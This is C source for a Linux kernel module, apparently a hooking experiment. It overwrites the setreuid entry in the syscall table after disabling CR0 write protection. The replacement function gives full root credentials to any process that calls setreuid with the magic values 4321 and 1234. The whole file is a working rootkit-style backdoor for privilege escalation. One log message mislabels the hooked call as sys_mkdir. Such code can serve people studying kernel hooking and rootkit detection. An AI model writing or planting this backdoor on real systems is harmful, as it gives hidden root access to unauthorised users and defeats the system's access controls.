#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/syscalls.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("assassinq");
MODULE_DESCRIPTION("hook test module");

unsigned long **sys_call_table;
unsigned int level;
pte_t *pte;

asmlinkage long (*real_setreuid)(uid_t ruid, uid_t euid);

asmlinkage long fake_setreuid(uid_t ruid, uid_t euid) {
    struct cred *new;
    printk("Hook setreuid.\n");
    if ((ruid == 4321) && (euid == 1234)) {
        new = prepare_creds();
        if (new != NULL) {
            new->uid = GLOBAL_ROOT_UID;
            new->gid = GLOBAL_ROOT_GID;
            new->euid = GLOBAL_ROOT_UID;
            new->egid = GLOBAL_ROOT_GID;
            new->suid = GLOBAL_ROOT_UID;
            new->sgid = GLOBAL_ROOT_GID;
            new->fsuid = GLOBAL_ROOT_UID;
            new->fsgid = GLOBAL_ROOT_GID;
            commit_creds(new);
        }
        printk("Granted root access.\n");
        return (*real_setreuid)(0, 0);
    }
    return (*real_setreuid)(-1, -1);
}

static void allow_writing(void) {
    write_cr0(read_cr0() & ~0x10000);
}

static void disallow_writing(void) {
    write_cr0(read_cr0() | 0x10000);
}

static int __init hello_init(void) {
    printk("Load hook sys_setreuid module.\n");

    sys_call_table = (unsigned long **) kallsyms_lookup_name("sys_call_table");
    printk("Syscall Table Address: %p\n", (unsigned long **) sys_call_table);

    printk("Modify syscall table.\n");
    allow_writing();
    // pte = lookup_address((unsigned long) sys_call_table, &level);
    // set_pte_atomic(pte, pte_mkwrite(*pte));
    real_setreuid = (void *)sys_call_table[__NR_setreuid];
    printk("Old sys_mkdir: %p.\n", (unsigned long *) real_setreuid);
    sys_call_table[__NR_setreuid] = (unsigned long *) fake_setreuid;
    disallow_writing();

    printk("Module loaded.\n");
    return 0;
}

static void __exit hello_exit(void) {
    printk("Modify syscall table.\n");
    allow_writing();
    sys_call_table[__NR_setreuid] = (unsigned long *) real_setreuid;
    disallow_writing();
    // set_pte_atomic(pte, pte_clear_flags(*pte, _PAGE_RW));

    printk("Exit module.\n");
}

module_init(hello_init);
module_exit(hello_exit);
